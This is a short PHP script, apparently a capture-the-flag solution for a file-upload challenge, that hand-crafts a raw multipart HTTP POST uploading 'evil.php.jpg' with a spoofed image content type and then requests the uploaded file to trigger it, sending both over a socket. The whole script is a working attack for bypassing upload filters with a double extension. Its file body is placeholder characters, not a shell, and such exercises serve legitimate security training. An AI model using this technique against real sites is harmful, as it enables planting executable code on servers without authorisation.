<?php

$host = "";
$port = 80;
$page = "";
 
// Here we have the file we're uploading (note the content-type):
$payload ="------ThisIsABoundary\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n500\r\n------ThisIsABoundary\r\nContent-Disposition: form-data; name=\"meta\"; filename=\"evil.php.jpg\"\r\nContent-Type: image/jpeg\r\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n\r\n------ThisIsABoundary--";
 
// Finally, craft the request and send it.
$content_length = strlen($payload);
$headers = array(
    "POST {$page} HTTP/1.1",
    "Host: {$host}:{$port}",
    "Content-Length: {$content_length}",
    "User-Agent: Evil Robot",
    "Cookie: PHPSESSID=nvp7ns678XXXXXXXXXX2q3fge9r94;",
    "Content-Type: multipart/form-data; boundary=----ThisIsABoundary",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
);
 
$request = implode("\r\n", $headers) . "\r\n\r\n" . $payload . "\r\n";

$headers = array(
    "GET /realiste/ch8/upload/evil.php.jpg HTTP/1.1",
    "Host: {$host}:{$port}",
//    "Content-Length: {$content_length}",
    "User-Agent: Evil Robot",
    "Cookie: Session=MTo6MGQ2MzAzMTg2NGVhZWVhYjhiYWY2NmJlZTRlOWMzYjk%3D; spip_session=3141_501164308f0e38f4172a9c395b7c2614; PHPSESSID=nvp7ns6787qepinf2q3fge9r94;",
    "Accept: */*"
);

$request .= implode("\r\n", $headers) . "\r\n\r\n";
print $request;



$fp = fsockopen($host, $port, $errno, $errstr)
      or die("ERROR: $errno - $errstr");

fwrite($fp, $request);

while (!feof($fp)) {
      echo fgets($fp, 128);
}

fclose($fp);

?>
